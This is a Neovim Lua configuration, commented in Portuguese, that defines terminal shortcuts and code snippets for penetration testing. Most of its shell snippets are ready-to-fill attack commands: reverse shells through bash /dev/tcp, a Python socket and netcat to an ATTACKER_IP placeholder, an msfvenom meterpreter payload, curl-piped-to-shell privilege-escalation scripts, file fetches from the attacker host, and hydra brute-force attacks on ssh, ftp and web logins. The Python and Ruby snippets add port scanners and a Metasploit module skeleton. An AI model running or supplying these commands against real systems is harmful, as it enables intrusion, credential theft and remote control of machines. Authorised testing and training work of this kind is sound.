return {
  -- Terminal integrado para ferramentas de segurança
  {
    "akinsho/toggleterm.nvim",
    version = "*",
    event = "VeryLazy",
    opts = {
      size = function(term)
        if term.direction == "horizontal" then
          return 15
        elseif term.direction == "vertical" then
          return vim.o.columns * 0.4
        end
      end,
      open_mapping = [[<C-\>]],
      direction = "float",
      float_opts = {
        border = "rounded",
      },
      shade_terminals = true,
      shading_factor = 2,
    },
    config = function(_, opts)
      require("toggleterm").setup(opts)
      -- Atalhos para terminais específicos
      local Terminal = require("toggleterm.terminal").Terminal
      local lazygit = Terminal:new({ cmd = "lazygit", hidden = true })
      vim.keymap.set("n", "<leader>tg", function() lazygit:toggle() end, { desc = "LazyGit" })
    end,
    keys = {
      { "<C-\\>", "<cmd>ToggleTerm<CR>", desc = "Toggle Terminal" },
      { "<leader>tt", "<cmd>ToggleTerm direction=horizontal<CR>", desc = "Terminal Horizontal" },
      { "<leader>tv", "<cmd>ToggleTerm direction=vertical<CR>", desc = "Terminal Vertical" },
      { "<leader>tf", "<cmd>ToggleTerm direction=float<CR>", desc = "Terminal Float" },
    },
  },

  -- Snippets para comandos de segurança
  {
    "L3MON4D3/LuaSnip",
    dependencies = { "rafamadriz/friendly-snippets" },
    config = function()
      local ls = require("luasnip")
      local s = ls.snippet
      local t = ls.text_node
      local i = ls.insert_node
      local f = ls.function_node

      ls.add_snippets("sh", {
        -- Nmap scans
        s("nmap", {
          t("nmap -sV -sC -O -oN "), i(1, "output.txt"), t(" "), i(2, "target"),
        }),
        s("nmapfull", {
          t("nmap -A -T4 -p- -oN "), i(1, "full_scan.txt"), t(" "), i(2, "target"),
        }),
        s("nmapstealth", {
          t("nmap -sS -T2 -f --data-length 50 -oN "), i(1, "stealth.txt"), t(" "), i(2, "target"),
        }),
        s("nmapudp", {
          t("nmap -sU --top-ports 100 -oN "), i(1, "udp_scan.txt"), t(" "), i(2, "target"),
        }),
        s("nmapvuln", {
          t("nmap --script vuln -oN "), i(1, "vuln_scan.txt"), t(" "), i(2, "target"),
        }),

        -- Directory enumeration
        s("gobuster", {
          t("gobuster dir -u "), i(1, "http://target"), t(" -w /usr/share/wordlists/dirb/common.txt -o "), i(2, "dirs.txt"),
        }),
        s("ffuf", {
          t("ffuf -u "), i(1, "http://target/FUZZ"), t(" -w /usr/share/wordlists/dirb/common.txt -o "), i(2, "ffuf.json"), t(" -of json"),
        }),
        s("ferox", {
          t("feroxbuster -u "), i(1, "http://target"), t(" -w /usr/share/wordlists/dirbuster/common.txt -o "), i(2, "ferox.txt"),
        }),

        -- SQL Injection
        s("sqlmap", {
          t("sqlmap -u '"), i(1, "http://target/page?id=1"), t("' --dbs --batch"),
        }),
        s("sqlmappost", {
          t("sqlmap -u '"), i(1, "http://target/login"), t("' --data='"), i(2, "user=admin&pass=test"), t("' --dbs --batch"),
        }),

        -- Subdomain enumeration
        s("subfinder", {
          t("subfinder -d "), i(1, "target.com"), t(" -o "), i(2, "subdomains.txt"),
        }),
        s("amass", {
          t("amass enum -passive -d "), i(1, "target.com"), t(" -o "), i(2, "amass.txt"),
        }),

        -- Web analysis
        s("whatweb", {
          t("whatweb -a 3 "), i(1, "http://target"),
        }),
        s("nikto", {
          t("nikto -h "), i(1, "http://target"), t(" -o "), i(2, "nikto.txt"),
        }),

        -- Password attacks
        s("hydra", {
          t("hydra -l "), i(1, "admin"), t(" -P /usr/share/wordlists/rockyou.txt "), i(2, "target"), t(" "), i(3, "ssh"),
        }),
        s("hydraftp", {
          t("hydra -l "), i(1, "admin"), t(" -P /usr/share/wordlists/rockyou.txt ftp://"), i(2, "target"),
        }),
        s("hydrahttp", {
          t("hydra -l "), i(1, "admin"), t(" -P /usr/share/wordlists/rockyou.txt "), i(2, "target"), t(" http-post-form '"), i(3, "/login:user=^USER^&pass=^PASS^:F=incorrect'"),
        }),

        -- Reverse shells
        s("revbash", {
          t("bash -i >& /dev/tcp/"), i(1, "ATTACKER_IP"), t("/"), i(2, "4444"), t(" 0>&1"),
        }),
        s("revpython", {
          t("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""), i(1, "ATTACKER_IP"), t("\","), i(2, "4444"), t("));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"),
        }),
        s("revnc", {
          t("nc -e /bin/bash "), i(1, "ATTACKER_IP"), t(" "), i(2, "4444"),
        }),

        -- Privilege escalation
        s("linpeas", {
          t("curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"),
        }),
        s("linenum", {
          t("curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | sh"),
        }),

        -- Transfer files
        s("serve", {
          t("python3 -m http.server "), i(1, "8000"),
        }),
        s("wget", {
          t("wget http://"), i(1, "ATTACKER_IP"), t(":"), i(2, "8000"), t("/"), i(3, "file"),
        }),
        s("curl", {
          t("curl -o "), i(1, "output"), t(" http://"), i(2, "ATTACKER_IP"), t(":"), i(3, "8000"), t("/"), i(4, "file"),
        }),

        -- Network recon
        s("netdiscover", {
          t("netdiscover -r "), i(1, "192.168.1.0/24"),
        }),
        s("enum4linux", {
          t("enum4linux -a "), i(1, "TARGET_IP"),
        }),
        s("smbclient", {
          t("smbclient -L //"), i(1, "TARGET_IP"), t(" -N"),
        }),

        -- Metasploit templates
        s("msfvenom", {
          t("msfvenom -p "), i(1, "linux/x64/meterpreter/reverse_tcp"), t(" LHOST="), i(2, "ATTACKER_IP"), t(" LPORT="), i(3, "4444"), t(" -f "), i(4, "elf"), t(" -o "), i(5, "payload"),
        }),

        -- Quick env setup
        s("exportip", {
          t("export LHOST="), i(1, "ATTACKER_IP"), t("\nexport LPORT="), i(2, "4444"),
        }),
        s("tun0", {
          t("ip addr show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1"),
        }),
      })
    end,
  },

  -- Snippets para Python (scripts de automação)
  {
    "L3MON4D3/LuaSnip",
    ft = "python",
    config = function()
      local ls = require("luasnip")
      local s = ls.snippet
      local t = ls.text_node
      local i = ls.insert_node

      ls.add_snippets("python", {
        s("requests", {
          t("import requests\n\n"),
          t("response = requests.get('"), i(1, "http://target"), t("')\n"),
          t("print(response.status_code)\n"),
          t("print(response.text)"),
        }),
        s("nmapscript", {
          t("import nmap\n\n"),
          t("nm = nmap.PortScanner()\n"),
          t("nm.scan('"), i(1, "target"), t("', '"), i(2, "22,80,443"), t("')\n"),
          t("for host in nm.all_hosts():\n"),
          t("    print(f'{host}: {nm[host].state()}')"),
        }),
        s("socketscanner", {
          t("import socket\n\n"),
          t("def scan(target, ports):\n"),
          t("    for port in ports:\n"),
          t("        try:\n"),
          t("            s = socket.socket()\n"),
          t("            s.connect((target, port))\n"),
          t("            print(f'Port {port}: OPEN')\n"),
          t("            s.close()\n"),
          t("        except:\n"),
          t("            pass\n\n"),
          t("scan('"), i(1, "TARGET_IP"), t("', range(1, 1025))"),
        }),
      })
    end,
  },

  -- Snippets para Ruby (Metasploit modules)
  {
    "L3MON4D3/LuaSnip",
    ft = "ruby",
    config = function()
      local ls = require("luasnip")
      local s = ls.snippet
      local t = ls.text_node
      local i = ls.insert_node

      ls.add_snippets("ruby", {
        s("msfmodule", {
          t("class MetasploitModule < Msf::Auxiliary\n"),
          t("  include Msf::Exploit::Remote::HttpClient\n\n"),
          t("  def initialize(info = {})\n"),
          t("    super(update_info(info,\n"),
          t("      'Name'           => '"), i(1, "Module Name"), t("',\n"),
          t("      'Description'    => %q{"), i(2, "Description"), t("},\n"),
          t("      'Author'         => ["), i(3, "Author"), t("],\n"),
          t("      'License'        => MSF_LICENSE,\n"),
          t("      'References'     => []\n"),
          t("    ))\n"),
          t("  end\n\n"),
          t("  def run\n"),
          t("    "), i(4, "# TODO: implement"),
          t("\n  end\n"),
          t("end"),
        }),
      })
    end,
  },
}
